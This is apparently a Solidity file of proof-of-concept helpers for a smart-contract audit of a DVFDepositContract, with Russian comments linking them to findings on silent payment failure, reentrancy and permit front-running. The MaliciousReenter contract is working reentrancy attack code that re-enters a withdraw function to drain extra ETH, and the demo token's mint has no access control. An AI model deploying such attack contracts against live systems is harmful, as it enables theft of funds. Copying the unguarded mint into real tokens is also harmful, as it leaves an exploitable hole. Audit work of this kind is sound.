// SPDX-License-Identifier: GPL-3.0-only
pragma solidity >=0.4.22 <0.9.0;

import "./DVFDepositContract.sol";

/**
 * =========================================================
 * PoC Helper: RevertingReceiver
 * Используется в Finding #1, #4 — демонстрация тихого сбоя
 * =========================================================
 */
contract RevertingReceiver {
    receive() external payable {
        revert("ETH_REJECTED");
    }

    fallback() external payable {
        revert("FALLBACK_REJECTED");
    }
}

/**
 * =========================================================
 * PoC Helper: SilentFailReceiver
 * =========================================================
 */
contract SilentFailReceiver {
    event LogReceived(address sender, uint256 amount);

    receive() external payable {
        emit LogReceived(msg.sender, msg.value);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * =========================================================
 * PoC Helper: MaliciousReenter
 * Используется в Finding #2 — демонстрация Reentrancy
 * =========================================================
 */
contract MaliciousReenter {
    DVFDepositContract public target;
    address public token;
    bool public attackTriggered;

    event AttackExecuted(uint256 amount);

    constructor(DVFDepositContract _target, address _token) {
        target = _target;
        token = _token;
    }

    receive() external payable {
        if (!attackTriggered && address(target).balance >= 1 ether) {
            attackTriggered = true;
            // Reentrancy: пытаемся вывести еще ETH через authorized функцию
            target.withdrawNativeV2(payable(address(this)), 1 ether);
            emit AttackExecuted(1 ether);
        }
    }

    function getEthBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * =========================================================
 * PoC Helper: SimplePermitToken (EIP-2612)
 * Используется в Finding #3 — permit фронтраннинг
 * =========================================================
 */
contract SimplePermitToken {
    string public name = "PoC Permit Token";
    string public symbol = "POCPT";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public nonces;

    bytes32 public DOMAIN_SEPARATOR;
    // PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    constructor(uint256 _chainId) {
        uint256 chainId;
        assembly { chainId := chainid() }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                chainId,
                address(this)
            )
        );
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "INSUFFICIENT_BALANCE");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "INSUFFICIENT_BALANCE");
        if (allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= amount, "INSUFFICIENT_ALLOWANCE");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(deadline >= block.timestamp, "PERMIT_EXPIRED");
        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline));
        bytes32 hash = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        address signer = ecrecover(hash, v, r, s);
        require(signer == owner, "INVALID_SIGNATURE");
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
}
